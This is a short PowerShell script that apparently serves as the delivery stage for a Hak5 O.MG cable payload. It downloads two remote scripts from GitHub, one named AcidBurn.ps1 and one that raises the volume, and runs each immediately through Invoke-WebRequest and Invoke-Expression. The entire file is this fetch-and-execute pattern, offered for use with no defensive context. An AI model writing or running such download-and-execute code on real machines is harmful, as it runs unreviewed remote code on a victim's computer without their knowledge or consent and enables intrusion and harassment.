# Download and execute AcidBurn.ps1
$urlAcidBurn = "https://raw.githubusercontent.com/I-Am-Jakoby/hak5-submissions/main/OMG/Payloads/OMG-AcidBurn/AcidBurn.ps1?dl=1"
$scriptAcidBurn = Invoke-WebRequest -Uri $urlAcidBurn -UseBasicP -Method Get
Invoke-Expression $scriptAcidBurn.Content

# Download and execute volume_increase.ps1
$urlVolumeIncrease = "https://raw.githubusercontent.com/Muhammad-Hayyan/vol_increase/main/vol.ps1?dl=1"
$scriptVolumeIncrease = Invoke-WebRequest -Uri $urlVolumeIncrease -UseBasicP -Method Get
Invoke-Expression $scriptVolumeIncrease.Content
